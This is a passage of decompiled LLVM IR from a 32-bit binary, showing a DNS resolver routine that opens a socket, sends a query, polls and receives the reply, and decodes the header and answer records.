  %v1_805500f = phi i32 [ %v1_805500c, %dec_label_pc_8054fef ], [ %v0_8054ff9, %dec_label_pc_8054fd8 ]
  %v0_805500f = load i32, i32* @ecx, align 4
  %v2_805500f = add i32 %v1_805500f, -4
  %v3_805500f = inttoptr i32 %v2_805500f to i32*
  store i32 %v0_805500f, i32* %v3_805500f, align 4
  %v1_8055010 = add i32 %v1_805500f, -8
  %v2_8055010 = inttoptr i32 %v1_8055010 to i32*
  store i32 17, i32* %v2_8055010, align 4
  %v1_8055012 = add i32 %v1_805500f, -12
  %v2_8055012 = inttoptr i32 %v1_8055012 to i32*
  store i32 2, i32* %v2_8055012, align 4
  %v1_8055014 = add i32 %v1_805500f, 156
  %v2_8055014 = inttoptr i32 %v1_8055014 to i16*
  %v3_8055014 = load i16, i16* %v2_8055014, align 2
  %v4_8055014 = zext i16 %v3_8055014 to i32
  store i32 %v4_8055014, i32* %eax.global-to-local, align 4
  %v2_805501c = add i32 %v1_805500f, -16
  %v3_805501c = inttoptr i32 %v2_805501c to i32*
  store i32 %v4_8055014, i32* %v3_805501c, align 4
  %v4_805501d = call i32 @socket(i32 -1, i32 %v15_8054e00, i32 %v3_8054e5f)
  store i32 %v4_805501d, i32* %eax.global-to-local, align 4
  %v1_8055022 = load i32, i32* @esp, align 4
  %v2_8055022 = add i32 %v1_8055022, 36
  %v3_8055022 = inttoptr i32 %v2_8055022 to i32*
  store i32 %v4_805501d, i32* %v3_8055022, align 4
  %v0_8055026 = load i32, i32* @esp, align 4
  %v1_8055026 = add i32 %v0_8055026, 16
  %v0_8055029 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055029 = icmp slt i32 %v0_8055029, 0
  br i1 %v2_8055029, label %dec_label_pc_8055056, label %dec_label_pc_805502d

dec_label_pc_805502d:                             ; preds = %dec_label_pc_805500f
  %v1_805502d = add i32 %v0_8055026, 172
  store i32 %v1_805502d, i32* %eax.global-to-local, align 4
  %v0_8055034 = load i32, i32* @edx, align 4
  %v2_8055034 = add i32 %v0_8055026, 12
  %v3_8055034 = inttoptr i32 %v2_8055034 to i32*
  store i32 %v0_8055034, i32* %v3_8055034, align 4
  %v1_8055035 = add i32 %v0_8055026, 8
  %v2_8055035 = inttoptr i32 %v1_8055035 to i32*
  store i32 28, i32* %v2_8055035, align 4
  %v0_8055037 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055037 = add i32 %v0_8055026, 4
  %v3_8055037 = inttoptr i32 %v2_8055037 to i32*
  store i32 %v0_8055037, i32* %v3_8055037, align 4
  %v1_8055038 = add i32 %v0_8055026, 36
  %v2_8055038 = inttoptr i32 %v1_8055038 to i32*
  %v3_8055038 = load i32, i32* %v2_8055038, align 4
  %v6_8055038 = inttoptr i32 %v0_8055026 to i32*
  store i32 %v3_8055038, i32* %v6_8055038, align 4
  %v4_805503c = call i32 @__libc_connect(i32 -1, i32 %v15_8054e00, i32 %v3_8054e5f)
  store i32 %v4_805503c, i32* %eax.global-to-local, align 4
  %v0_8055041 = load i32, i32* @esp, align 4
  %v2_8055044 = icmp slt i32 %v4_805503c, 0
  %v1_8055046 = icmp eq i1 %v2_8055044, false
  br i1 %v1_8055046, label %dec_label_pc_805505f, label %dec_label_pc_8055048

dec_label_pc_8055048:                             ; preds = %dec_label_pc_805502d
  %v1_8055048 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8055048, i32* %eax.global-to-local, align 4
  %v1_805504d = inttoptr i32 %v1_8055048 to i32*
  %v2_805504d = load i32, i32* %v1_805504d, align 4
  %v11_805504d = icmp eq i32 %v2_805504d, 101
  %v0_80553bf.pre = load i32, i32* @esp, align 4
  br i1 %v11_805504d, label %dec_label_pc_80553bf, label %dec_label_pc_8055056

dec_label_pc_8055056:                             ; preds = %dec_label_pc_8055048, %dec_label_pc_805500f
  %v17_8055056 = phi i32 [ %v1_8055026, %dec_label_pc_805500f ], [ %v0_80553bf.pre, %dec_label_pc_8055048 ]
  %v1_8055056 = add i32 %v17_8055056, 28
  %v2_8055056 = inttoptr i32 %v1_8055056 to i32*
  %v3_8055056 = load i32, i32* %v2_8055056, align 4
  %v4_8055056 = add i32 %v3_8055056, 1
  store i32 %v4_8055056, i32* %v2_8055056, align 4
  br label %dec_label_pc_80553e0.backedge

dec_label_pc_805505f:                             ; preds = %dec_label_pc_805502d
  %v0_805505f = load i32, i32* @ebx, align 4
  %v1_805505f = load i32, i32* @esi, align 4
  %v2_805505f = add i32 %v1_805505f, %v0_805505f
  store i32 %v2_805505f, i32* %eax.global-to-local, align 4
  %v1_8055062 = add i32 %v0_8055041, 12
  %v2_8055062 = inttoptr i32 %v1_8055062 to i32*
  store i32 0, i32* %v2_8055062, align 4
  %v0_8055064 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055064 = add i32 %v0_8055041, 8
  %v3_8055064 = inttoptr i32 %v2_8055064 to i32*
  store i32 %v0_8055064, i32* %v3_8055064, align 4
  %v2_8055065 = add i32 %v0_8055041, 4
  %v3_8055065 = inttoptr i32 %v2_8055065 to i32*
  store i32 %v2_8054d72, i32* %v3_8055065, align 4
  %v1_8055066 = add i32 %v0_8055041, 36
  %v2_8055066 = inttoptr i32 %v1_8055066 to i32*
  %v3_8055066 = load i32, i32* %v2_8055066, align 4
  %v6_8055066 = inttoptr i32 %v0_8055041 to i32*
  store i32 %v3_8055066, i32* %v6_8055066, align 4
  %v5_805506a = call i32 @__libc_send(i32 -1, i32 %v15_8054e00, i32 %v3_8054e5f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805506a, i32* %eax.global-to-local, align 4
  %v0_805506f = load i32, i32* @esp, align 4
  %v1_805506f = add i32 %v0_805506f, 36
  %v2_805506f = inttoptr i32 %v1_805506f to i32*
  %v3_805506f = load i32, i32* %v2_805506f, align 4
  %v2_8055073 = add i32 %v0_805506f, 228
  %v3_8055073 = inttoptr i32 %v2_8055073 to i32*
  store i32 %v3_805506f, i32* %v3_8055073, align 4
  %v0_805507a = load i32, i32* @esp, align 4
  %v1_805507a = add i32 %v0_805507a, 232
  %v2_805507a = inttoptr i32 %v1_805507a to i16*
  store i16 1, i16* %v2_805507a, align 2
  %v0_8055084 = load i32, i32* @esp, align 4
  %v1_8055087 = add i32 %v0_8055084, 8
  %v2_8055087 = inttoptr i32 %v1_8055087 to i32*
  store i32 10000, i32* %v2_8055087, align 4
  %v1_805508c = add i32 %v0_8055084, 4
  %v2_805508c = inttoptr i32 %v1_805508c to i32*
  store i32 1, i32* %v2_805508c, align 4
  %v1_805508e = add i32 %v0_8055084, 228
  store i32 %v1_805508e, i32* %eax.global-to-local, align 4
  %v3_8055095 = inttoptr i32 %v0_8055084 to i32*
  store i32 %v1_805508e, i32* %v3_8055095, align 4
  %v0_8055096 = call i32 @__libc_poll()
  store i32 %v0_8055096, i32* %eax.global-to-local, align 4
  %v0_805509b = load i32, i32* @esp, align 4
  %v1_805509b = add i32 %v0_805509b, 16
  %tmp48 = icmp slt i32 %v0_8055096, 1
  br i1 %tmp48, label %dec_label_pc_80553bf, label %dec_label_pc_80550a6

dec_label_pc_80550a6:                             ; preds = %dec_label_pc_805505f
  %v1_80550a6 = add i32 %v0_805509b, 12
  %v2_80550a6 = inttoptr i32 %v1_80550a6 to i32*
  store i32 0, i32* %v2_80550a6, align 4
  %v1_80550a8 = add i32 %v0_805509b, 8
  %v2_80550a8 = inttoptr i32 %v1_80550a8 to i32*
  store i32 512, i32* %v2_80550a8, align 4
  %v2_80550ad = add i32 %v0_805509b, 4
  %v3_80550ad = inttoptr i32 %v2_80550ad to i32*
  store i32 %v2_8054d72, i32* %v3_80550ad, align 4
  %v1_80550ae = add i32 %v0_805509b, 36
  %v2_80550ae = inttoptr i32 %v1_80550ae to i32*
  %v3_80550ae = load i32, i32* %v2_80550ae, align 4
  %v6_80550ae = inttoptr i32 %v0_805509b to i32*
  store i32 %v3_80550ae, i32* %v6_80550ae, align 4
  %v5_80550b2 = call i32 @__libc_recv(i32 -1, i32 %v15_8054e00, i32 %v3_8054e5f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80550b2, i32* @eax, align 4
  %v1_80550b7 = load i32, i32* @esp, align 4
  %v2_80550b7 = add i32 %v1_80550b7, 32
  %v3_80550b7 = inttoptr i32 %v2_80550b7 to i32*
  store i32 %v5_80550b2, i32* %v3_80550b7, align 4
  %v0_80550bb = load i32, i32* @esp, align 4
  %v1_80550bb = add i32 %v0_80550bb, 16
  %v7_80550c1 = icmp sgt i32 %v5_80550b2, 11
  br i1 %v7_80550c1, label %dec_label_pc_80550c7, label %dec_label_pc_8055374

dec_label_pc_80550c7:                             ; preds = %dec_label_pc_80550a6
  %v0_80550c7 = load i32, i32* @ebx, align 4
  %v2_80550c7 = add i32 %v0_80550bb, 12
  %v3_80550c7 = inttoptr i32 %v2_80550c7 to i32*
  store i32 %v0_80550c7, i32* %v3_80550c7, align 4
  %v0_80550c8 = load i32, i32* @ebx, align 4
  %v2_80550c8 = add i32 %v0_80550bb, 8
  %v3_80550c8 = inttoptr i32 %v2_80550c8 to i32*
  store i32 %v0_80550c8, i32* %v3_80550c8, align 4
  %v1_80550c9 = add i32 %v0_80550bb, 84
  store i32 %v1_80550c9, i32* %eax.global-to-local, align 4
  %v2_80550cd = add i32 %v0_80550bb, 4
  %v3_80550cd = inttoptr i32 %v2_80550cd to i32*
  store i32 %v1_80550c9, i32* %v3_80550cd, align 4
  %v3_80550ce = inttoptr i32 %v0_80550bb to i32*
  store i32 %v2_8054d72, i32* %v3_80550ce, align 4
  %v0_80550cf = call i32 @__decode_header()
  store i32 %v0_80550cf, i32* %eax.global-to-local, align 4
  %v0_80550d4 = load i32, i32* @esp, align 4
  %v1_80550d4 = add i32 %v0_80550d4, 84
  %v2_80550d4 = inttoptr i32 %v1_80550d4 to i32*
  %v3_80550d4 = load i32, i32* %v2_80550d4, align 4
  store i32 %v3_80550d4, i32* %edx.global-to-local, align 4
  %v2_80550d8 = add i32 %v0_80550d4, 72
  %v3_80550d8 = inttoptr i32 %v2_80550d8 to i32*
  store i32 %v3_80550d4, i32* %v3_80550d8, align 4
  %v0_80550dc = load i32, i32* @esp, align 4
  %v1_80550dc = add i32 %v0_80550dc, 16
  %v1_80550df = add i32 %v0_80550dc, 60
  %v2_80550df = inttoptr i32 %v1_80550df to i32*
  %v3_80550df = load i32, i32* %v2_80550df, align 4
  store i32 %v3_80550df, i32* @eax, align 4
  %v0_80550e3 = load i32, i32* %edx.global-to-local, align 4
  %v12_80550e3 = icmp eq i32 %v0_80550e3, %v3_80550df
  %v1_80550e5 = icmp eq i1 %v12_80550e3, false
  br i1 %v1_80550e5, label %dec_label_pc_8055374, label %dec_label_pc_80550eb

dec_label_pc_80550eb:                             ; preds = %dec_label_pc_80550c7
  %v1_80550eb = add i32 %v0_80550dc, 88
  %v2_80550eb = inttoptr i32 %v1_80550eb to i32*
  %v3_80550eb = load i32, i32* %v2_80550eb, align 4
  %v4_80550eb = icmp eq i32 %v3_80550eb, 0
  br i1 %v4_80550eb, label %dec_label_pc_8055374, label %dec_label_pc_80550f6

dec_label_pc_80550f6:                             ; preds = %dec_label_pc_80550eb
  %v1_80550f6 = add i32 %v0_80550dc, 112
  %v2_80550f6 = inttoptr i32 %v1_80550f6 to i32*
  %v3_80550f6 = load i32, i32* %v2_80550f6, align 4
  store i32 %v3_80550f6, i32* @eax, align 4
  %v9_80550fa = icmp eq i32 %v3_80550f6, 3
  %v1_80550fd = icmp eq i1 %v9_80550fa, false
  br i1 %v1_80550fd, label %dec_label_pc_8055165, label %dec_label_pc_80550ff

dec_label_pc_80550ff:                             ; preds = %dec_label_pc_80550f6
  %v1_80550ff = add i32 %v0_80550dc, 67
  %v2_80550ff = inttoptr i32 %v1_80550ff to i8*
  %v3_80550ff = load i8, i8* %v2_80550ff, align 1
  %v4_80550ff = icmp eq i8 %v3_80550ff, 0
  %v1_8055104 = icmp eq i1 %v4_80550ff, false
  br i1 %v1_8055104, label %dec_label_pc_8055155, label %dec_label_pc_8055106

dec_label_pc_8055106:                             ; preds = %dec_label_pc_80550ff
  %v0_8055106 = load i32, i32* @ecx, align 4
  %v2_8055106 = add i32 %v0_80550dc, 12
  %v3_8055106 = inttoptr i32 %v2_8055106 to i32*
  store i32 %v0_8055106, i32* %v3_8055106, align 4
  %v1_8055107 = add i32 %v0_80550dc, 8
  %v2_8055107 = inttoptr i32 %v1_8055107 to i32*
  store i32 ptrtoint (i32* @global_var_8061548.726 to i32), i32* %v2_8055107, align 4
  %v1_805510c = add i32 %v0_80550dc, 4
  %v2_805510c = inttoptr i32 %v1_805510c to i32*
  store i32 134560279, i32* %v2_805510c, align 4
  %v1_8055111 = add i32 %v0_80550dc, 200
  store i32 %v1_8055111, i32* @esi, align 4
  %v3_8055118 = inttoptr i32 %v0_80550dc to i32*
  store i32 %v1_8055111, i32* %v3_8055118, align 4
  %v2_8055119 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8054e00)
  store i32 %v2_8055119, i32* %eax.global-to-local, align 4
  %v0_805511e = load i32, i32* @esp, align 4
  %v1_805511e = inttoptr i32 %v0_805511e to i32*
  store i32 ptrtoint (i32* @global_var_8061548.726 to i32), i32* %v1_805511e, align 4
  %v1_8055125 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8055125, i32* %eax.global-to-local, align 4
  %v0_805512a = load i32, i32* @esp, align 4
  %v1_805512a = inttoptr i32 %v0_805512a to i32*
  %v2_805512a = load i32, i32* %v1_805512a, align 4
  store i32 %v2_805512a, i32* @eax, align 4
  %v3_805512a = add i32 %v0_805512a, 4
  %v1_805512b = inttoptr i32 %v3_805512a to i32*
  %v2_805512b = load i32, i32* %v1_805512b, align 4
  store i32 %v2_805512b, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_805512b, align 4
  %v0_805512e = load i32, i32* @esi, align 4
  store i32 %v0_805512e, i32* %v1_805512a, align 4
  %v0_805512f = load i32, i32* @global_var_8067c38.790, align 8
  store i32 %v0_805512f, i32* %ebx.global-to-local, align 4
  %v2_8055135 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8054e00)
  store i32 %v2_8055135, i32* %eax.global-to-local, align 4
  %v0_805513a = load i32, i32* @esp, align 4
  %v1_805513d = add i32 %v0_805512f, -1
  store i32 %v1_805513d, i32* @ebx, align 4
  %v1_805513e = add i32 %v0_805513a, 52
  %v2_805513e = inttoptr i32 %v1_805513e to i32*
  %v3_805513e = load i32, i32* %v2_805513e, align 4
  %v5_805513e = sub i32 %v3_805513e, %v1_805513d
  %v11_805513e = xor i32 %v3_805513e, %v1_805513d
  %v12_805513e = xor i32 %v5_805513e, %v3_805513e
  %v13_805513e = and i32 %v12_805513e, %v11_805513e
  %v14_805513e = icmp slt i32 %v13_805513e, 0
  %v16_805513e = icmp slt i32 %v5_805513e, 0
  %v2_8055142 = icmp eq i1 %v16_805513e, %v14_805513e
  br i1 %v2_8055142, label %dec_label_pc_8055155, label %dec_label_pc_8055144

dec_label_pc_8055144:                             ; preds = %dec_label_pc_8055106
  %v4_8055144 = add i32 %v3_805513e, 1
  store i32 %v4_8055144, i32* %v2_805513e, align 4
  %v0_8055148 = load i32, i32* @esp, align 4
  %v1_8055148 = add i32 %v0_8055148, 56
  %v2_8055148 = inttoptr i32 %v1_8055148 to i32*
  %v3_8055148 = load i32, i32* %v2_8055148, align 4
  store i32 %v3_8055148, i32* %edx.global-to-local, align 4
  %v2_805514c = add i32 %v0_8055148, 44
  %v3_805514c = inttoptr i32 %v2_805514c to i32*
  store i32 %v3_8055148, i32* %v3_805514c, align 4
  br label %dec_label_pc_80553e0.backedge

dec_label_pc_8055155:                             ; preds = %dec_label_pc_8055106, %dec_label_pc_80550ff
  %v0_8055155 = call i32 @__GI___h_errno_location()
  store i32 %v0_8055155, i32* %eax.global-to-local, align 4
  %v1_805515a = inttoptr i32 %v0_8055155 to i32*
  store i32 1, i32* %v1_805515a, align 4
  br label %dec_label_pc_8055418

dec_label_pc_8055165:                             ; preds = %dec_label_pc_80550f6
  %v1_8055165 = icmp eq i32 %v3_80550f6, 0
  %v1_8055167 = icmp eq i1 %v1_8055165, false
  br i1 %v1_8055167, label %dec_label_pc_8055374, label %dec_label_pc_805516d

dec_label_pc_805516d:                             ; preds = %dec_label_pc_8055165
  %v1_805516d = add i32 %v0_80550dc, 120
  %v2_805516d = inttoptr i32 %v1_805516d to i32*
  %v3_805516d = load i32, i32* %v2_805516d, align 4
  %tmp49 = icmp slt i32 %v3_805516d, 1
  br i1 %tmp49, label %dec_label_pc_805517d, label %dec_label_pc_8055174

dec_label_pc_8055174:                             ; preds = %dec_label_pc_805516d
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_805519c55 = add i32 %v0_80550dc, 116
  %v3_805519c56 = inttoptr i32 %v2_805519c55 to i32*
  %v4_805519c57 = load i32, i32* %v3_805519c56, align 4
  %v5_805519c58 = sub i32 0, %v4_805519c57
  %v13_805519c62 = and i32 %v4_805519c57, %v5_805519c58
  %v14_805519c63 = icmp slt i32 %v13_805519c62, 0
  %v16_805519c65 = icmp slt i32 %v5_805519c58, 0
  %v2_80551a066 = icmp eq i1 %v16_805519c65, %v14_805519c63
  br i1 %v2_80551a066, label %dec_label_pc_80551a2, label %dec_label_pc_805518d

dec_label_pc_805517d:                             ; preds = %dec_label_pc_805516d
  %v0_805517d = call i32 @__GI___h_errno_location()
  store i32 %v0_805517d, i32* %eax.global-to-local, align 4
  %v1_8055182 = inttoptr i32 %v0_805517d to i32*
  store i32 4, i32* %v1_8055182, align 4
  br label %dec_label_pc_8055418

dec_label_pc_805518d:                             ; preds = %dec_label_pc_8055174, %dec_label_pc_805518d
  %v0_80551a468 = phi i32 [ %v1_8055199, %dec_label_pc_805518d ], [ %v1_80550dc, %dec_label_pc_8055174 ]
  %v0_805518d67 = phi i32 [ %v0_8055191, %dec_label_pc_805518d ], [ %v3_80550f6, %dec_label_pc_8055174 ]
  %v2_805518d = add i32 %v0_80551a468, -4
  %v3_805518d = inttoptr i32 %v2_805518d to i32*
  store i32 %v0_805518d67, i32* %v3_805518d, align 4
  %v0_805518e = load i32, i32* @eax, align 4
  %v2_805518e = add i32 %v0_80551a468, -8
  %v3_805518e = inttoptr i32 %v2_805518e to i32*
  store i32 %v0_805518e, i32* %v3_805518e, align 4
  %v0_805518f = load i32, i32* @esi, align 4
  %v2_805518f = add i32 %v0_80551a468, -12
  %v3_805518f = inttoptr i32 %v2_805518f to i32*
  store i32 %v0_805518f, i32* %v3_805518f, align 4
  %v2_8055190 = add i32 %v0_80551a468, -16
  %v3_8055190 = inttoptr i32 %v2_8055190 to i32*
  store i32 %v2_8054d72, i32* %v3_8055190, align 4
  %v0_8055191 = call i32 @__length_question()
  store i32 %v0_8055191, i32* @eax, align 4
  %v0_8055196 = load i32, i32* @ebx, align 4
  %v1_8055196 = add i32 %v0_8055196, 1
  store i32 %v1_8055196, i32* @ebx, align 4
  %v0_8055197 = load i32, i32* @esi, align 4
  %v2_8055197 = add i32 %v0_8055197, %v0_8055191
  store i32 %v2_8055197, i32* @esi, align 4
  %v0_8055199 = load i32, i32* @esp, align 4
  %v1_8055199 = add i32 %v0_8055199, 16
  %v2_805519c = add i32 %v0_8055199, 116
  %v3_805519c = inttoptr i32 %v2_805519c to i32*
  %v4_805519c = load i32, i32* %v3_805519c, align 4
  %v5_805519c = sub i32 %v1_8055196, %v4_805519c
  %v11_805519c = xor i32 %v4_805519c, %v1_8055196
  %v12_805519c = xor i32 %v5_805519c, %v1_8055196
  %v13_805519c = and i32 %v12_805519c, %v11_805519c
  %v14_805519c = icmp slt i32 %v13_805519c, 0
  %v16_805519c = icmp slt i32 %v5_805519c, 0
  %v2_80551a0 = icmp eq i1 %v16_805519c, %v14_805519c
  br i1 %v2_80551a0, label %dec_label_pc_80551a2, label %dec_label_pc_805518d

dec_label_pc_80551a2:                             ; preds = %dec_label_pc_805518d, %dec_label_pc_8055174
  %v0_80551a4.lcssa = phi i32 [ %v1_80550dc, %dec_label_pc_8055174 ], [ %v1_8055199, %dec_label_pc_805518d ]
  store i32 0, i32* @ebx, align 4
  %v1_80551a4 = add i32 %v0_80551a4.lcssa, 27
  %v2_80551a4 = inttoptr i32 %v1_80551a4 to i8*
  store i8 1, i8* %v2_80551a4, align 1
  %v0_80552d2.pre = load i32, i32* @ebx, align 4
  %v1_80552d2.pre = load i32, i32* @esp, align 4
  %v2_80552d269 = add i32 %v1_80552d2.pre, 104
  %v3_80552d270 = inttoptr i32 %v2_80552d269 to i32*
  %v4_80552d271 = load i32, i32* %v3_80552d270, align 4
  %v5_80552d272 = sub i32 %v0_80552d2.pre, %v4_80552d271
  %v11_80552d274 = xor i32 %v4_80552d271, %v0_80552d2.pre
  %v12_80552d275 = xor i32 %v5_80552d272, %v0_80552d2.pre
  %v13_80552d276 = and i32 %v12_80552d275, %v11_80552d274
  %v14_80552d277 = icmp slt i32 %v13_80552d276, 0
  %v16_80552d279 = icmp slt i32 %v5_80552d272, 0
  %v2_80552d680 = icmp eq i1 %v16_80552d279, %v14_80552d277
  br i1 %v2_80552d680, label %dec_label_pc_80552e2, label %dec_label_pc_80552d8.lr.ph

dec_label_pc_80552d8.lr.ph:                       ; preds = %dec_label_pc_80551a2
  %v0_80552d8.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80552d8

dec_label_pc_80551ae:                             ; preds = %dec_label_pc_80552d8
  %v1_80551ae = add i32 %v0_80551ae81, 116
  store i32 %v1_80551ae, i32* %eax.global-to-local, align 4
  %v2_80551b2 = add i32 %v0_80551ae81, -4
  %v3_80551b2 = inttoptr i32 %v2_80551b2 to i32*
  store i32 %v1_80551ae, i32* %v3_80551b2, align 4
  %v3_80551b3 = load i32, i32* %v3_80552d8, align 4
  %v5_80551b3 = add i32 %v0_80551ae81, -8
  %v6_80551b3 = inttoptr i32 %v5_80551b3 to i32*
  store i32 %v3_80551b3, i32* %v6_80551b3, align 4
  %v0_80551b7 = load i32, i32* @esi, align 4
  %v2_80551b7 = add i32 %v0_80551ae81, -12
  %v3_80551b7 = inttoptr i32 %v2_80551b7 to i32*
  store i32 %v0_80551b7, i32* %v3_80551b7, align 4
  %v2_80551b8 = add i32 %v0_80551ae81, -16
  %v3_80551b8 = inttoptr i32 %v2_80551b8 to i32*
  store i32 %v2_8054d72, i32* %v3_80551b8, align 4
  %v0_80551b9 = call i32 @__decode_answer()
  store i32 %v0_80551b9, i32* @eax, align 4
  %v1_80551be = load i32, i32* @esp, align 4
  %v2_80551be = add i32 %v1_80551be, 68
  %v3_80551be = inttoptr i32 %v2_80551be to i32*
  store i32 %v0_80551b9, i32* %v3_80551be, align 4
  %v0_80551c2 = load i32, i32* @esp, align 4
  %v1_80551c2 = add i32 %v0_80551c2, 16
  %v2_80551c5 = icmp slt i32 %v0_80551b9, 0
  %v1_80551c7 = icmp eq i1 %v2_80551c5, false
  br i1 %v1_80551c7, label %dec_label_pc_80551e1, label %dec_label_pc_80551c9

dec_label_pc_80551c9:                             ; preds = %dec_label_pc_80551ae
  %v0_80551c9 = load i32, i32* @ebx, align 4
  %v1_80551c9 = icmp eq i32 %v0_80551c9, 0
  br i1 %v1_80551c9, label %dec_label_pc_8055374, label %dec_label_pc_80551d1

dec_label_pc_80551d1:                             ; preds = %dec_label_pc_80551c9
  %v1_80551d1 = add i32 %v0_80551c2, 100
  %v2_80551d1 = inttoptr i32 %v1_80551d1 to i32*
  %v3_80551d1 = load i32, i32* %v2_80551d1, align 4
  %v4_80551d1 = icmp eq i32 %v3_80551d1, 0
  br i1 %v4_80551d1, label %dec_label_pc_8055374, label %dec_label_pc_80552e2

dec_label_pc_80551e1:                             ; preds = %dec_label_pc_80551ae
  %v1_80551e1 = add i32 %v0_80551c2, 43
  %v2_80551e1 = inttoptr i32 %v1_80551e1 to i8*
  %v3_80551e1 = load i8, i8* %v2_80551e1, align 1
  %v4_80551e1 = icmp eq i8 %v3_80551e1, 0
  br i1 %v4_80551e1, label %dec_label_pc_8055282, label %dec_label_pc_80551ec

dec_label_pc_80551ec:                             ; preds = %dec_label_pc_80551e1
  %v0_80551ec = load i32, i32* @edi, align 4
  %v1_80551ec = add i32 %v0_80551ec, 28
  %v2_80551ec = inttoptr i32 %v1_80551ec to i32*
  %v3_80551ec = load i32, i32* %v2_80551ec, align 4
  store i32 %v3_80551ec, i32* %eax.global-to-local, align 4
  %v2_80551ef = add i32 %v0_80551c2, 160
  %v3_80551ef = inttoptr i32 %v2_80551ef to i32*
  store i32 %v3_80551ec, i32* %v3_80551ef, align 4
  %v0_80551f6 = load i32, i32* @edi, align 4
  %v1_80551f6 = add i32 %v0_80551f6, 32
  %v2_80551f6 = inttoptr i32 %v1_80551f6 to i32*
  %v3_80551f6 = load i32, i32* %v2_80551f6, align 4
  store i32 %v3_80551f6, i32* %eax.global-to-local, align 4
  %v1_80551f9 = load i32, i32* @esp, align 4
  %v2_80551f9 = add i32 %v1_80551f9, 148
  %v3_80551f9 = inttoptr i32 %v2_80551f9 to i32*
  store i32 %v3_80551f6, i32* %v3_80551f9, align 4
  %v0_8055200 = load i32, i32* @edi, align 4
  %v1_8055200 = add i32 %v0_8055200, 36
  %v2_8055200 = inttoptr i32 %v1_8055200 to i32*
  %v3_8055200 = load i32, i32* %v2_8055200, align 4
  store i32 %v3_8055200, i32* %eax.global-to-local, align 4
  %v1_8055203 = load i32, i32* @esp, align 4
  %v2_8055203 = add i32 %v1_8055203, 152
  %v3_8055203 = inttoptr i32 %v2_8055203 to i32*
  store i32 %v3_8055200, i32* %v3_8055203, align 4
  %v0_805520a = load i32, i32* @ecx, align 4
  %v1_805520a = load i32, i32* @esp, align 4
  %v2_805520a = add i32 %v1_805520a, -4
  %v3_805520a = inttoptr i32 %v2_805520a to i32*
  store i32 %v0_805520a, i32* %v3_805520a, align 4
  %v1_805520b = add i32 %v1_805520a, -8
  %v2_805520b = inttoptr i32 %v1_805520b to i32*
  store i32 40, i32* %v2_805520b, align 4
  %v1_805520d = add i32 %v1_805520a, 116
  store i32 %v1_805520d, i32* %edx.global-to-local, align 4
  %v2_8055211 = add i32 %v1_805520a, -12
  %v3_8055211 = inttoptr i32 %v2_8055211 to i32*
  store i32 %v1_805520d, i32* %v3_8055211, align 4
  %v0_8055212 = load i32, i32* @edi, align 4
  %v2_8055212 = add i32 %v1_805520a, -16
  %v3_8055212 = inttoptr i32 %v2_8055212 to i32*
  store i32 %v0_8055212, i32* %v3_8055212, align 4
  %v5_8055213 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8054e00, i32 %v3_8054e5f)
  store i32 %v5_8055213, i32* %eax.global-to-local, align 4
  %v0_8055218 = load i32, i32* @edi, align 4
  %v1_8055218 = add i32 %v0_8055218, 4
  %v2_8055218 = inttoptr i32 %v1_8055218 to i32*
  %v3_8055218 = load i32, i32* %v2_8055218, align 4
  store i32 %v3_8055218, i32* %eax.global-to-local, align 4
  %v0_805521b = load i32, i32* @esp, align 4
  %v1_805521b = add i32 %v0_805521b, 16
  %v9_805521e = icmp eq i32 %v3_8055218, 24
  br i1 %v9_805521e, label %dec_label_pc_80551ec.dec_label_pc_8055245_crit_edge, label %dec_label_pc_8055223

dec_label_pc_80551ec.dec_label_pc_8055245_crit_edge: ; preds = %dec_label_pc_80551ec
  %.pre24 = add i32 %v0_805521b, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8055245.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8055245

dec_label_pc_8055223:                             ; preds = %dec_label_pc_80551ec
  %v1_8055223 = add i32 %v0_8055218, 28
  %v2_8055223 = inttoptr i32 %v1_8055223 to i32*
  %v3_8055223 = load i32, i32* %v2_8055223, align 4
  %v4_8055223 = icmp eq i32 %v3_8055223, 0
  br i1 %v4_8055223, label %dec_label_pc_80552e2, label %dec_label_pc_805522d

dec_label_pc_805522d:                             ; preds = %dec_label_pc_8055223
  %v1_805522d = add i32 %v0_805521b, 260
  %v2_805522d = inttoptr i32 %v1_805522d to i32*
  %v3_805522d = load i32, i32* %v2_805522d, align 4
  %v12_805522d = icmp eq i32 %v3_805522d, 1
  br i1 %v12_805522d, label %dec_label_pc_8055245, label %dec_label_pc_8055237

dec_label_pc_8055237:                             ; preds = %dec_label_pc_805522d
  %v12_8055237 = icmp eq i32 %v3_805522d, 28
  %v1_805523f = icmp eq i1 %v12_8055237, false
  br i1 %v1_805523f, label %dec_label_pc_80552e2, label %dec_label_pc_8055245

dec_label_pc_8055245:                             ; preds = %dec_label_pc_80551ec.dec_label_pc_8055245_crit_edge, %dec_label_pc_8055237, %dec_label_pc_805522d
  %v4_8055245 = phi i32 [ %v4_8055245.pre, %dec_label_pc_80551ec.dec_label_pc_8055245_crit_edge ], [ %v3_805522d, %dec_label_pc_8055237 ], [ 1, %dec_label_pc_805522d ]
  %v15_8055245 = icmp eq i32 %v3_8055218, %v4_8055245
  br i1 %v15_8055245, label %dec_label_pc_805525a, label %dec_label_pc_805524e

dec_label_pc_805524e:                             ; preds = %dec_label_pc_8055245
  %v1_8055251 = inttoptr i32 %v0_8055218 to i32*
  %v2_8055251 = load i32, i32* %v1_8055251, align 4
  %v5_8055251 = inttoptr i32 %v0_805521b to i32*
  store i32 %v2_8055251, i32* %v5_8055251, align 4
  %v1_8055253 = call i32 @free(i32 -1)
  store i32 %v1_8055253, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80552ca

dec_label_pc_805525a:                             ; preds = %dec_label_pc_8055245
  %v0_805525a = load i32, i32* @ebx, align 4
  %v1_805525c = sub i32 -1, %v0_805525a
  store i32 %v1_805525c, i32* %eax.global-to-local, align 4
